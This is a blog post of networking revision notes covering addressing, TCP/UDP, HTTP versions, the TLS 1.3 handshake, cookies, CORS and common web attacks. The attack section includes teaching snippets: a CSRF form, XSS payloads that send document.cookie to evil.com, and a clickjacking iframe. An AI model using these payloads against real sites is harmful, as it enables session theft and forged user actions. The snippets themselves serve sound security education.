---
title: "CS Fundamentals: Networking"
description: "Networking from an engineer's lens: IP, MAC, TCP/UDP, HTTP, TLS, proxies, VPN, BitTorrent, DNS, and what really happens when you open a website, plus projects to build next."
pubDatetime: 2026-10-10T22:11:07.000+05:30 
author: Aayushmaan Soni
slug: /cs-fundamentals/networking
tags: ["networking"]
draft: false
featured: true
series:  CS Fundamentals
seriesOrder:  1
---

## Table of Contents

## Introduction
This is **Part 1** of my **CS Fundamentals** series, where I'm putting down the core CS subjects as short, to-the-point notes. They're the same notes I use myself for learning and revision, cleaned up so anyone can use them.

Each part covers the basics, but always from a **software engineer's lens**: what actually shows up when you build, deploy, and debug real systems, not just what's asked in exams.

**In this part** we start from the very basics (IP, MAC, ports, TCP/UDP), move up through HTTP, TLS, browser security, proxies, VPNs, P2P (BitTorrent) and DNS, and then tie it all together by following one request from your home router to a rendered web page. At the end, there's a list of projects to build so the concepts actually stick.

Read it top to bottom the first time; after that, use it as a quick reference.

## 1. Networking Fundamentals
- **Networking**: connecting devices so they can communicate and exchange data
- **Internet**: a huge network of interconnected networks around the world
- **Hosts**: a network-connected device with an IP address
- **Links**: path between two network devices
- **LAN (Local Area Network)**: connects devices within a small/local area
- **WAN (Wide Area Network)**: connects networks across a large geographical area
- **PAN (Personal Area Network)**: connects personal devices within a very short range, typically around one person
- **ISP (Internet Service Provider)**: company that provides you access to the Internet
- **Switches**: connects multiple devices within the same LAN; forwards data to the correct device using **MAC addresses** (Layer 2)
- **Hub**: older, simpler version of a switch; sends the data to everyone
- **Routers**: connects different networks (e.g. your LAN to your ISP's network); forwards packets using **IP addresses** (Layer 3)
- **Modem**: converts signals between your network and the ISP's line (fiber/DSL/cable)
- **Home "router"**: usually router + switch + access point (+ sometimes modem) in one box
- **Access Point**: provides wireless access to an existing network
- **Wi-Fi**: wireless networking technology/protocol family (IEEE 802.11) used to connect devices to a LAN
- **Bits**: smallest unit of data; 0 or 1; represented as `b`
- **Bytes**: 8 bits; represented as `B`
  - ISP speeds are in **Mbps** (bits), downloads show **MB/s** (bytes) → 100 Mbps ≈ 12.5 MB/s
- **Default Gateway**: device your computer sends traffic to when the destination is outside its own local network, usually router
- **VLAN (Virtual LAN)**: logically divide one physical LAN/switch infrastructure into separate LANs

## 2. IP Addressing
- **IP address**: address used to identify a device/interface on a network so data can be sent to the right destination
- **IPv4**: 
  - older and most widely known version of IP 
  - 32 bits
  - Represented using Dotted decimal (`192.168.1.10`)
  - 4 octets, each of 8 bits; value range 0 - 255
  - Possible address count: 2^32 = 4,294,967,296 ≈ 4.3 billion (not enough → NAT)
- **IPv6**:
  - newer version of IP
  - 128 bits
  - Represented using Hexadecimal, colon-separated (`2001:db8::10`)
  - Possible address count: 2^128
  - **no broadcast at all**; uses multicast instead
  - uses **NDP (Neighbor Discovery Protocol)** instead of ARP
- **Public IP**: address used by your network to communicate with the Internet; ISP gives your router/network a public IP; globally unique
- **Private IP**: used inside a LAN; for communication of devices within same n/w; not routable on the Internet
  - Ranges: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`
- **NAT (Network Address Translation)**: router rewrites private IP:port → its public IP:port on the way out and back on the way in; that's why all devices on your n/w appear with the same public IP
- **CGNAT (Carrier-Grade NAT)**: ISP does NAT again on top of your router; many homes share one public IP (why hosting a server from home often doesn't work)
- **Loopback (`127.0.0.1`)**: computer is talking to itself; always refers to your own machine; no router, Wi-Fi, ISP, or Internet involved
  - whole `127.0.0.0/8` range is loopback; `localhost` usually resolves to `127.0.0.1`; IPv6 loopback is `::1`
- **`0.0.0.0` vs `127.0.0.1` (binding)**:
  - app bound to `127.0.0.1` → reachable only from the same machine
  - app bound to `0.0.0.0` → listens on all interfaces; reachable from other machines too
  - common bug: app inside Docker binds to `127.0.0.1` → not reachable from host
- **Network address**: IP address = Network part + Host part; network address identifies the network itself
- **Host address**: host part identifies a particular device within that network
- **Subnetting**: deciding how much of the IP belongs to the network and how much is left for hosts
- **Subnet mask**: `255.255.255.0`; first 24 bits network part; 8 bits host part
- **CIDR**: notation tells you how many bits are used for the network part
    - `/8`: first 8 bits are the network portion
    - `/16`: first 16 bits are the network portion
    - `/24`: first 24 bits are the network portion
    - Usable hosts = 2^(32 − n) − 2
    - Example `192.168.1.0/24`:
      - `192.168.1.0` → network address (identifies whole n/w); reserved
      - `192.168.1.1` ... `192.168.1.254` → 254 usable host addresses
      - `192.168.1.255` → broadcast address (send to every device on this n/w); reserved
- **Unicast**: One to one; One sender sends data to one specific destination
- **Broadcast**: One to all; One sender sends data to all devices on the relevant local network
- **Multicast**: One to a group; One sender sends data to a specific group of interested receivers, rather than everyone
- **DHCP (Dynamic Host Configuration Protocol)**: automatically gives devices the network configuration they need (IP, Subnet mask, Default Gateway, DNS, ...)

## 3. MAC
- **MAC address**: 48-bit hardware address of a network interface (`a4:5e:60:12:34:56`); set by manufacturer; used for delivery **within a local link**
- **End-to-end (IP)**: source & destination IP stay the same for the whole journey (NAT aside); IP = final destination
- **Hop-to-hop (MAC)**: source & destination MAC only cover the current link (this device → next device); at every router the old frame is dropped and a new one is written
- **ARP (Address Resolution Protocol)**: broadcast in LAN asking "who has this IPv4? tell me your MAC"; the bridge between IP (where to go) and MAC (next hop)
  - For destinations outside the LAN, ARP is done for the **default gateway's** IP, not the final destination
- **NDP (Neighbor Discovery Protocol)**: IPv6 replacement for ARP; uses ICMPv6 multicast (not broadcast) to find a neighbor's MAC from its IPv6 address; also discovers routers and helps devices auto-configure their IPv6 address (SLAAC)

## 4. Ports & Sockets
- **Port**: 16-bit number (0–65535); helps the OS know which application should receive the network traffic; software concept
- **Well-known ports**: 0–1023; need root/admin to bind on Linux
- **Registered ports**: 1024–49151; used by common apps/databases
- **Ephemeral ports**: temporary port picked by the OS for the client side of a connection; server listens on a fixed port but client also needs a port to receive replies
  - Range: 49152–65535 (IANA); Linux default 32768–60999
- **Common ports**: 22 (SSH), 53 (DNS), 80 (HTTP), 443 (HTTPS), 3306 (MySQL), 5432 (Postgres), 6379 (Redis), 27017 (MongoDB)
- **Port binding**: application claiming/listening on a port; only one app can bind the same IP:port (`address already in use` error)
- **Socket**: OS-provided abstraction that lets your program communicate over a network without implementing all the low-level networking operations itself
- **5-tuple**: a connection is uniquely identified by (protocol, src IP, src port, dst IP, dst port); that's how one server port handles thousands of clients
- **TCP socket**: socket that uses TCP to communicate
- **UDP socket**: uses UDP to communicate
- **Client socket**: socket used by the application initiating communication with another application
- **Server socket**: used by an application to receive incoming connections or data
- **Socket lifecycle**:
  - Server: `socket()` -> `bind(0.0.0.0:8000)` -> `listen()` -> `accept()` (returns a new connected socket per client) -> send/recv -> `close()`
  - Client: `socket()` -> `connect(server_ip:8000)` (OS picks ephemeral port) -> send/recv -> `close()`

## 5. TCP & UDP
- **TCP**: Transmission Control Protocol; connection-oriented; reliable, ordered delivery of a stream of bytes
  - Used by: HTTP/1.1, HTTP/2, SSH, databases
- **UDP**: User Datagram Protocol; connectionless; no reliability, no ordering; sends independent messages called datagrams; low overhead
  - Used by: DNS, video calls, online games, QUIC (HTTP/3)
- **TCP 3-way handshake**: SYN (Client initiates connection) -> SYN-ACK (Server acknowledges and responds) -> ACK (Client acknowledges the response); costs 1 RTT before any data is sent
- **TCP connection termination**:
  - Graceful: FIN/ACK exchange (Client sends FIN -> Server sends ACK -> Server sends FIN -> Client sends ACK)
  - Abort: RST; connection is killed immediately (e.g. `connection reset by peer`)
- **TIME_WAIT**: side that closes first waits (~60s on Linux) before fully releasing the connection, so late packets don't mess up a new one; too many short connections → lots of TIME_WAIT sockets → reuse connections (pooling/keep-alive)
- **Sequence numbers**: help TCP track which bytes have been sent and which bytes have been received
- **Acknowledgements**: An acknowledgement tells the sender which data has been received; uses cumulative acknowledgements
- **Retransmission**: sending data again when TCP determines it may not have arrived
- **Flow control**: prevents a fast sender from overwhelming a slow receiver (receiver window)
- **Congestion control**: prevents a sender from injecting data into the network faster than the network can handle (slow start → new connections start slow)
- **Head-of-line blocking**: one lost packet blocks all data behind it until it's retransmitted, since TCP delivers in order; one reason HTTP/3 moved to QUIC over UDP
- **Nagle's algorithm**: TCP buffers small writes to send fewer packets; adds latency for small messages; disabled with `TCP_NODELAY`
- **TCP Keep-Alive**: optional mechanism for checking whether an otherwise idle TCP connection's remote peer is still reachable
  - Not the same as **HTTP keep-alive**, which means reusing one TCP connection for multiple HTTP requests

## 6. OSI Model
- **OSI (Open Systems Interconnection)**: reference model that divides network communication into 7 layers; each layer does one job and only talks to the layer above/below it
- Not implemented as-is in real life (the Internet runs on TCP/IP), but its **layer numbers are used everywhere** in engineering talk: "L2 switch", "L3 routing", "L4 vs L7 load balancer"
- Real protocols don't always fit cleanly in one layer (e.g. TLS, QUIC, ARP); use it as a mental map, not a strict rule
- 7 layers, top to bottom (mnemonic: **A**ll **P**eople **S**hould **T**ry **N**ew **D**elicious **P**izza):
    - **L7 Application**: protocols apps use to talk over the network (not the app itself); e.g. HTTP, DNS, SMTP, SSH, FTP
    - **L6 Presentation**: how data is represented so the receiver can understand it; encoding (UTF-8, JSON), compression, encryption
    - **L5 Session**: establishing, managing and ending sessions between apps; in practice usually handled by the app or TLS, rarely a separate thing
    - **L4 Transport**: app-to-app (process-to-process) delivery using ports; segmentation, reliability, flow control (depends on protocol); e.g. TCP, UDP; PDU: **segment** (TCP) / **datagram** (UDP)
    - **L3 Network**: logical addressing (IP) and routing packets between networks; e.g. IP, ICMP; PDU: **packet**; device: router
    - **L2 Data Link**: delivery on the local link (hop-to-hop); MAC addressing, framing, error detection; e.g. Ethernet, Wi-Fi; PDU: **frame**; device: switch
    - **L1 Physical**: transmitting raw bits as electrical/light/radio signals; e.g. cables, fiber, radio; PDU: **bits**; device: hub, repeater
- **Debugging by layer**: work bottom-up; cable/Wi-Fi up? (L1/L2) -> got an IP, can ping gateway? (L3) -> port open? (L4) -> app responding correctly? (L7)

## 7. TCP/IP Model
- Model the Internet actually runs on; 4 layers (some books split Link into Data Link + Physical and call it 5)
- 4 layers, top to bottom:
    - **Application** (OSI L5–L7): protocols and data formats apps use to communicate; e.g. HTTP, DNS, TLS, SSH
    - **Transport** (OSI L4): communication between app endpoints on different hosts using ports; e.g. TCP, UDP
    - **Internet** (OSI L3): IP addressing and routing packets between networks; e.g. IP, ICMP
    - **Link / Network Access** (OSI L1–L2): delivery across the local link + physical transmission; e.g. Ethernet, Wi-Fi
- **Encapsulation**: on send, each layer wraps the data from the layer above with its own header
- **Decapsulation**: on receive, each layer strips its header and passes the rest up

```
Application:  [ HTTP data ]
Transport:    [ TCP hdr (ports) | HTTP data ]                          -> segment
Internet:     [ IP hdr (IPs) | TCP hdr | HTTP data ]                   -> packet
Link:         [ Eth hdr (MACs) | IP hdr | TCP hdr | HTTP data | FCS ]  -> frame -> bits
```

- Each device only opens as many layers as it needs:
  - switch -> reads up to L2 (MAC)
  - router -> reads up to L3 (IP); rewrites L2 header every hop (hop-to-hop vs end-to-end)
  - L4 load balancer -> reads IP + port; L7 load balancer / reverse proxy -> reads HTTP (URL, headers)
  - your app -> sees only the data; OS kernel handles L2–L4

## 8. HTTP Fundamentals
- **HTTP**: Hypertext Transfer Protocol; application layer (L7) protocol that defines how clients and servers communicate through requests and responses; runs over TCP (HTTP/1.1, HTTP/2) or QUIC/UDP (HTTP/3)
- **Stateless**: each request is independent; server doesn't remember previous requests by itself; state is added on top using cookies, sessions, or tokens
- **HTTP request**: message a client sends to a server asking it to perform an operation or provide a resource; method + path + headers + optional body
- **HTTP response**: message a server sends back to the client; status code + headers + optional body

```
GET /api/users/42?include=posts HTTP/1.1
Host: api.example.com
Accept: application/json
Authorization: Bearer <token>

HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 28

{"id": 42, "name": "Aayush"}
```

- **URL**: Uniform Resource Locator; identifies a resource by specifying its location and access method
  - `https://api.example.com:443/api/users/42?include=posts#profile`
  - **SCHEME** - `https`; **HOST** - `api.example.com`; **PORT** - `443` (default for https, so usually omitted; 80 for http); **PATH** - `/api/users/42`; **QUERY** - `?include=posts`; **FRAGMENT** - `#profile`
  - **Fragment is never sent to the server**; browser uses it client-side only (scroll to section, SPA routing)
- **URI**: Uniform Resource Identifier; a general identifier for a resource; the umbrella category that includes URLs and URNs
- **URN**: Uniform Resource Name; identifies a resource by a name within a defined namespace, rather than specifying its network location; e.g. `urn:isbn:9780131103627`
- **Query parameters**: key-value inputs carried in the URL after `?`; `?category=laptop&sort=price&page=2`; used for filtering, sorting, pagination; avoid putting secrets here (ends up in logs & browser history)
- **Path parameters**: variable values embedded in the URL path; `/api/users/{user_id}` - here `user_id` is path parameter; used to identify a specific resource
- **Request body**: contains data the client sends to the server (JSON, form data, files); format described by `Content-Type`
- **Response body**: contains the content returned by the server
- **Safe method**: doesn't change server state (read-only); GET, HEAD, OPTIONS
- **Idempotent method**: sending the same request once or N times leaves the server in the same state; GET, HEAD, OPTIONS, PUT, DELETE
  - Why it matters: idempotent requests are safe to **retry** on timeout/network failure; for POST use an `Idempotency-Key` header (e.g. payments) so retries don't charge twice
- **HTTP methods**
  - **GET**: retrieve data; safe & idempotent; should not change server state; cacheable; no body (by convention)
  - **POST**: create resources or trigger actions (`/orders`, `/login`, `/send-email`); not idempotent
  - **PUT**: create or fully replace a resource at a known URI; idempotent
  - **PATCH**: partially modify a resource; not guaranteed to be idempotent; "set name to Aayush" is repeatable, "increment balance by 100" is not
  - **DELETE**: remove a resource; idempotent (2nd delete may return 404, but server state is the same)
  - **HEAD**: same as GET but returns only headers, no body; safe & idempotent; e.g. check file size or if resource exists
  - **OPTIONS**: discover what methods/options the server supports for a resource; used by browsers for **CORS preflight**; safe & idempotent
  - **QUERY**: newer method; like GET (safe, idempotent, cacheable) but carries the query in the request body; useful when query is too big/complex for the URL; support is still limited
- **Status codes**
  - **1xx**: Informational; 101 (Switching Protocols - e.g. upgrade to WebSocket)
  - **2xx**: Success; 200 (OK), 201 (Created - new resource; usually with `Location` header), 202 (Accepted - job accepted for async processing), 204 (No Content - no response body)
  - **3xx**: Redirection; 301 (Moved Permanently), 302 (Found - temporary redirect), 304 (Not Modified - use your cached copy), 307/308 (temporary/permanent redirect that **keeps the method & body**; 301/302 may change POST to GET)
  - **4xx**: Client error (fix the request, retrying as-is won't help)
    - 400 (Bad Request - malformed request)
    - 401 (Unauthorized - actually means **unauthenticated**; who are you?)
    - 403 (Forbidden - authenticated but **not allowed**)
    - 404 (Not Found), 405 (Method Not Allowed), 409 (Conflict - e.g. duplicate / version conflict)
    - 415 (Unsupported Media Type - wrong `Content-Type`), 422 (Unprocessable Content - valid format but fails validation)
    - 429 (Too Many Requests - rate limited; check `Retry-After`)
  - **5xx**: Server error (often worth retrying with backoff)
    - 500 (Internal Server Error - bug/unhandled exception)
    - 502 (Bad Gateway - proxy/LB got an invalid response from the upstream server, e.g. app crashed)
    - 503 (Service Unavailable - overloaded or down for maintenance)
    - 504 (Gateway Timeout - proxy/LB didn't get a response from upstream in time, e.g. slow DB query)
- **Headers**: key-value metadata attached to an HTTP request or response; case-insensitive names; communicate content format, auth, caching, security policies
  - **Host**: which domain the request is for; lets one server/IP host many websites
  - **Content-Type**: format of the body (`application/json`, `text/html`, `multipart/form-data`)
  - **Content-Length**: size of the body in bytes
  - **Accept**: formats the client can handle
  - **Authorization**: credentials (`Bearer <token>`, `Basic ...`)
  - **User-Agent**: identifies the client (browser, curl, app)
  - **Cookie / Set-Cookie**: client sends cookies / server sets cookies
  - **Cache-Control**: caching rules (`no-store`, `max-age=3600`)
  - **ETag / If-None-Match**: version tag of a resource; client sends it back, server replies 304 if unchanged → saves bandwidth
  - **Location**: URL to redirect to (3xx) or of the newly created resource (201)
  - **Referer**: which page/URL led to the current request (yes, misspelled in the spec); controlled by `Referrer-Policy`

## 9. HTTP Versions
- **HTTP/1.0**: one request per TCP connection
  - Flow: open TCP connection (3-way handshake) -> send request -> get response -> close connection (FIN/ACK) -> repeat for the next request
  - Every request pays the handshake cost (1 RTT, +TLS handshake for HTTPS) and starts with TCP slow start again
  - A page with 50 resources (HTML, CSS, JS, images) = 50 new connections
  - Some implementations added `Connection: keep-alive` as an extension to reuse the TCP connection, but it was not the default
- **HTTP/1.1**: persistent connections by default
  - Multiple requests/responses reuse the same TCP connection; closed only when `Connection: close` is sent or it idles out
  - `Host` header made mandatory → many websites can share one IP (virtual hosting)
  - Chunked transfer encoding → server can start sending a response before knowing its full size (streaming)
  - Still **one request at a time per connection**: next request waits for the previous response
  - **Pipelining** (sending multiple requests without waiting) existed, but responses must still come back **in order**, so one slow response blocks the ones behind it → **HTTP-level head-of-line blocking**; browsers never really enabled it
  - Workaround: browsers open ~6 parallel TCP connections per host; developers used domain sharding, bundling, image sprites
- **HTTP/2**: many requests in parallel over **one** TCP connection
  - Messages are split into **binary frames**; each frame belongs to a **stream** (one request/response pair = one stream)
  - Frames from different streams are **interleaved (multiplexed)** on the same connection → responses no longer wait for each other at the HTTP level
  - Header compression (HPACK) → repeated headers like cookies & user-agent aren't resent in full on every request
  - Stream prioritization → client can hint which resources matter more (e.g. CSS before images)
  - Server push → server sends resources before client asks; rarely used well and now removed from major browsers
  - Problem: TCP delivers bytes **strictly in order**; if one TCP packet is lost, all bytes after it wait for retransmission, even those belonging to other streams → **TCP-level head-of-line blocking**; on lossy networks (mobile) this can make HTTP/2 slower than multiple HTTP/1.1 connections
  - In practice used only over HTTPS (browsers require TLS for HTTP/2)
- **HTTP/3**: HTTP over **QUIC** instead of TCP
  - **QUIC**: transport protocol built on top of UDP; implements reliability, ordering, loss recovery and congestion control itself, but **per stream**
  - Lost packet only stalls **its own stream**; other streams keep flowing → no TCP-level head-of-line blocking
  - **TLS 1.3 built into QUIC** → transport + encryption handshake combined; 1 RTT for a new connection, **0-RTT** for resumed connections (vs TCP + TLS: 2+ RTT)
  - **Connection migration**: connection is identified by a connection ID, not the IP:port 4-tuple → switching Wi-Fi → mobile data doesn't break the connection
  - Header compression via QPACK (HPACK adapted for out-of-order delivery)
  - Runs in user space (not OS kernel) → easier to evolve, but more CPU cost
  - Some networks/firewalls block or throttle UDP → browsers fall back to HTTP/2; server advertises HTTP/3 support via the `Alt-Svc` header or DNS `HTTPS` record
- **Binary framing**: breaking HTTP messages into smaller pieces called frames and encoding them in binary instead of plain text; faster and less error-prone to parse
- **Streams**: independent, logical, bidirectional sequence of frames within one HTTP/2 or HTTP/3 connection; each has its own ID
- **Multiplexing**: interleaving frames from multiple streams over the same connection, so many requests are in flight at once
- **Head-of-line blocking**: first item in the queue blocks everything behind it
  - HTTP/1.1 → at HTTP level (responses must be in order)
  - HTTP/2 → fixed at HTTP level, but still exists at TCP level
  - HTTP/3 → fixed at both levels (per-stream ordering in QUIC)
- **Header compression**: HTTP/2 uses HPACK, HTTP/3 uses QPACK; both sides keep a table of headers already seen, so a repeated header is sent as a small index into that table instead of the full text

## 10. HTTPS & TLS
- **HTTPS**: HTTP sent inside a **TLS** (Transport Layer Security) connection; default port 443
- TLS gives 3 things: **confidentiality** (nobody can read it), **integrity** (nobody can change it unnoticed), **authentication** (you're really talking to `bank.com`)
- **SSL**: old, broken predecessor of TLS; people still say "SSL certificate", but it's TLS today
- Below is how TLS 1.3 builds these, one problem at a time

### Key exchange
- **ECDHE** - client and server each create a temporary key pair and send only the public part (**key share**); each combines its own private part with the other's public part → both end up with the **same shared secret**, which is never sent over the network
  - Keys are new for every connection → **forward secrecy**: even if the server's private key leaks later, old recorded traffic can't be decrypted
- **HKDF** - both sides put the shared secret into HKDF on their own machines, with a label for each value, e.g. `HKDF(secret, "client key")`
    - Same secret + same label → same output on both sides
    - The **hash of the handshake messages so far** (transcript) is also mixed in → keys are tied to this exact handshake
    - Two sets of keys are made, and **both client and server compute both sets**:
        - **Handshake set** - client key, client IV, server key, server IV → used to encrypt the rest of the handshake (Certificate, CertificateVerify, Finished); made right after ServerHello
        - **Application set** - client key, client IV, server key, server IV → used to encrypt real data (HTTP requests and responses); made after the server's Finished
    - Plus **finished keys** (client + server) → used only for the Finished check
    - In each set: client key + IV lock what the client sends, server key + IV lock what the server sends

### Encrypting messages
- Client locks its messages with **client key + client IV**; server unlocks them with the same values
- Server locks its replies with **server key + server IV**; client unlocks them
- Encryption is **symmetric** (same key to lock and unlock) because it's fast; ECDHE was only needed to agree on that key
- **Nonce** = IV mixed (XOR) with the record number (0, 1, 2, ...)
    - IV stays the same; only the record number changes (it restarts at 0 when switching to a new key set)
    - Each side counts the records it sent and received; the number is never sent
    - Same message sent twice → different encrypted data
- **AES-GCM / ChaCha20-Poly1305** also add an **authentication tag** (check value), so any changed packet is rejected

### The problem: no authentication
- A MITM can do ECDHE with you and separately with the bank → reads and changes everything
- We have confidentiality + integrity, but no **authentication**
- Fix → certificates

### Certificates
- A certificate says: "this public key belongs to this hostname", signed by a **CA (Certificate Authority)**; e.g. Let's Encrypt, DigiCert
- **How the CA signs it** - hash all cert fields with SHA-256, then sign the hash with the **CA's private key**
    - Change anything (hostname, key, ...) → signature check fails
- **Chain of trust**
    - **Root CA** - private key locked in an HSM (Hardware Security Module) at the CA, mostly kept offline; root cert (public key only) is in your OS/browser **root store** (~150 roots)
    - Root signs the **intermediate CA** cert; intermediate does day-to-day signing
    - Intermediate signs the **leaf** cert for the website

```
Root CA (in root store)
  └── signs → Intermediate CA
                └── signs → example.com (leaf)
```

- Server sends leaf + intermediates, not the root (your device already has it)
- **Verification**
    - Leaf signature checked with intermediate's public key; intermediate's with root's public key
    - **Hostname** must be in the cert's **SAN (Subject Alternative Name)** list (stops an attacker using a valid cert for their own site)
    - Also checked: expiry, revocation, **CA:TRUE** flag on intermediates (a normal leaf cert can't sign other certs), **Certificate Transparency** (cert was publicly logged)
    - CA only issues a cert after you prove you control the domain (e.g. Let's Encrypt asks you to serve a file or add a DNS TXT record)

### CertificateVerify - proving ownership
- Certificates are public; anyone can send one → server must prove it has the **private key**
- Server signs a hash of the handshake so far (ClientHello, ServerHello, ..., Certificate) with its **private key**
- Client checks it with the **public key** from the certificate
- Attacker has no private key → can't sign; changed ECDHE values → hash doesn't match

### Finished - final check
- **Transcript** = all handshake messages in order
- `Finished = HMAC(finished key, hash of transcript)`
- Each side checks the other's value → confirms nothing was changed and both have the same keys
- One-time check only, **not used for encryption**

### Order on the wire
1. Client sends **ClientHello**: client key share, supported versions/ciphers, **SNI** (hostname it wants, so a server with many sites picks the right cert), **ALPN** (`h2`, `http/1.1` → decides the HTTP version)
2. Server sends **ServerHello** (server key share) → both compute the secret and make the **handshake keys** with HKDF
3. Server sends **EncryptedExtensions** (e.g. chosen ALPN), **Certificate, CertificateVerify, Finished** (encrypted with handshake keys)
4. Client checks everything → sends its **Finished**; both make the **application keys**
5. Encrypted application data both ways (key + IV + record number); the client can send its first HTTP request right after its Finished

```
Client                                         Server
  |--- SYN / SYN-ACK / ACK (TCP) ---------------|   1 RTT
  |--- ClientHello (key share, SNI, ALPN) ----->|
  |<-- ServerHello (key share) -----------------|
  |<-- {EncryptedExtensions, Certificate,       |   1 RTT
  |     CertificateVerify, Finished} -----------|
  |--- {Finished} + [HTTP request] ------------>|
  |<-- [HTTP response] -------------------------|
       {...} = handshake keys   [...] = application keys
```

- Cost: TLS 1.3 = 1 RTT (+1 RTT for TCP); TLS 1.2 = 2 RTT (+1 RTT for TCP); HTTP/3 (QUIC) merges transport + TLS into 1 RTT total
- **Session resumption**: server gives the client a ticket; next connection skips the certificate part
- **0-RTT**: on resumption, client sends data in its very first message; faster, but that data can be **replayed** by an attacker → only for safe requests (GET)
- **HSTS (HTTP Strict Transport Security)**: response header telling the browser "only ever use HTTPS for this site"; no clicking through cert errors; `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`

## 11. Browser Networking & Security
- **Origin**: Scheme (protocol) + Host (domain) + Port; all three must match to be same-origin; `https://example.com` vs `https://api.example.com` → different origins
- **Site**: Scheme + registrable domain (`example.com`); `app.example.com` and `api.example.com` are same-site but cross-origin; SameSite cookies use **site**, CORS uses **origin**
- **Same-Origin Policy**: browser security rule that restricts how a page from one origin can access resources from another origin
  - Blocks JS from **reading** cross-origin responses, DOM, cookies, storage
  - Does **not** block **sending** requests (forms, `<img>`, `<script>` to other origins still go out) → that's why CSRF exists
- **Cookie**: small piece of data (~4KB) that a website asks the browser to store; browser sends it back automatically on every matching request; how a stateless HTTP server remembers you (sessions, login)
- **Set-Cookie**: HTTP response header used by a server to ask the browser to store or update a cookie; `Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Lax; Path=/`; browser sends it back in the `Cookie` request header
- **Session cookies**: no `Expires` or `Max-Age`; browser removes it when the browsing session ends (session restore can keep it alive)
- **Persistent cookies**: has `Expires` (date) or `Max-Age` (seconds); survives browser restart until it expires
- **Domain & Path**: which hosts and URL paths receive the cookie; no `Domain` → only the exact host that set it; `Domain=example.com` → subdomains too
- **Secure**: browser sends the cookie only over HTTPS
- **HttpOnly**: JavaScript can't access the cookie (`document.cookie`); protects session cookies from being stolen via XSS
- **SameSite**: controls whether the cookie is sent on cross-site requests; main defense against CSRF
    - **Strict**: never sent cross-site; even following a link from another site arrives without it (user looks logged out)
    - **Lax**: sent only on top-level navigations with safe methods (clicking a link → GET); not on cross-site POST, fetch, iframes, images; **default** in Chromium browsers (Chrome, Edge) when not set
    - **None**: always sent cross-site; must also be `Secure`; needed for embeds/third-party widgets
- **CORS**: Cross-Origin Resource Sharing; browser-enforced mechanism that lets a server **relax** Same-Origin Policy by specifying which origins can read its responses
  - Server sends `Access-Control-Allow-Origin: http://localhost:3000`
  - Enforced only by browsers; curl, Postman, backend services ignore it
  - Protects users, not your server; not a replacement for auth
  - CORS error → fix on the **server** (allow the origin), not the frontend
- **Simple CORS requests**: sent directly without a preflight; browser then checks the response's CORS headers; if the origin isn't allowed, the request **still reached the server**, but JS can't read the response
  - Only GET, HEAD, POST with basic headers and `Content-Type` of `text/plain`, `multipart/form-data` or `application/x-www-form-urlencoded`
  - `POST` with `application/json` or an `Authorization` header → not simple → preflight
- **CORS preflight**: for non-simple requests, browser first sends an `OPTIONS` request asking "may I send this?"; actual request is sent only if the server allows it
  - Browser → `OPTIONS` + `Origin`, `Access-Control-Request-Method`, `Access-Control-Request-Headers`
  - Server → `Access-Control-Allow-Origin`, `-Allow-Methods`, `-Allow-Headers`, `-Max-Age` (cache preflight result to skip it next time)
  - Preflight must not require auth, or it fails
- **CORS with cookies**: client sends `credentials: "include"`; server must reply `Access-Control-Allow-Credentials: true` with the **exact** origin (`*` not allowed)

## 12. Common Web Attacks
- **CSRF**: Cross-Site Request Forgery; malicious website tricks your browser into sending an unwanted request to another website where you're logged in; browser attaches that site's cookies automatically, so the request looks legit
  - Example: you're logged in to `bank.com`; you open `evil.com`, which has a hidden auto-submitting form

```html
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.forms[0].submit()</script>
```

  - Attacker can't **read** the response (Same-Origin Policy), but doesn't need to; the action already happened
- **CSRF tokens**: unpredictable value generated by the server per session/form; must be sent with every state-changing request (hidden input or header); server rejects the request if the token is missing or wrong
  - Works because `evil.com` can't read your page on `bank.com` (Same-Origin Policy), so it can't know the token
- **CSRF defenses**: `SameSite=Lax`/`Strict` cookies (browser doesn't send cookies on cross-site POST); CSRF tokens; check `Origin`/`Referer` header; never change state on GET
  - APIs using `Authorization: Bearer <token>` header (not cookies) aren't affected, since browsers don't attach that header automatically
- **XSS**: Cross-Site Scripting; attacker gets their JavaScript to run **inside a trusted website**; script runs with that site's origin, so it can read page data, call APIs as the user, steal non-HttpOnly cookies/localStorage tokens, change the page
- **Reflected XSS**: malicious input in a request is immediately reflected into the response without escaping
  - Example: search page renders `You searched for: <query>` as HTML
  - Attacker sends victim a link: `https://shop.com/search?q=<script>fetch('https://evil.com?c='+document.cookie)</script>`
  - Victim clicks → script runs on `shop.com`
- **Stored XSS**: malicious content is saved (e.g. in DB) and later rendered unsafely to other users; more dangerous since it hits every viewer, no link needed
  - Example: comment `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">` saved on a blog; everyone who opens that post runs it
- **DOM XSS**: client-side JavaScript takes untrusted data (URL, hash, `postMessage`) and puts it into the page unsafely; server may never see the payload
  - Example: `element.innerHTML = location.hash.slice(1)` → `https://site.com/#<img src=x onerror=alert(1)>` executes
- **XSS defenses**:
  - Escape output based on context (HTML, attribute, URL, JS); React/Vue/Angular escape by default
  - Avoid raw HTML sinks: `innerHTML`, `dangerouslySetInnerHTML`, `v-html`, `eval`; use `textContent` instead
  - If you must render user HTML (rich text), sanitize it (e.g. DOMPurify)
  - `HttpOnly` cookies (script can't read session cookie); **CSP** as a second layer
- **CSP**: Content Security Policy; response header that tells the browser which sources of scripts, styles, images, frames, etc. are allowed; anything else is blocked; limits damage even if XSS slips through

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; object-src 'none'; frame-ancestors 'none'
```

  - `default-src 'self'` → by default only load from own origin
  - `script-src` → scripts only from own origin + that CDN; inline `<script>` and `onerror=` handlers are blocked (unless `'unsafe-inline'`, which defeats the purpose)
  - `frame-ancestors 'none'` → page can't be embedded in iframes (clickjacking defense)
  - Nonces (`script-src 'nonce-r4nd0m'`) allow specific inline scripts that the server marked
  - Roll out with `Content-Security-Policy-Report-Only` first to see what would break
- **Clickjacking**: attacker loads your site in an invisible iframe on top of their page and tricks the user into clicking buttons on your site (UI redressing)
  - Example: `evil.com` shows "Click to win a prize!"; an invisible iframe of `bank.com/settings` sits exactly over the button, so the user actually clicks "Delete account"

```html
<iframe src="https://bank.com/settings" style="opacity:0; position:absolute; top:0; left:0;"></iframe>
<button>Click to win a prize!</button>
```

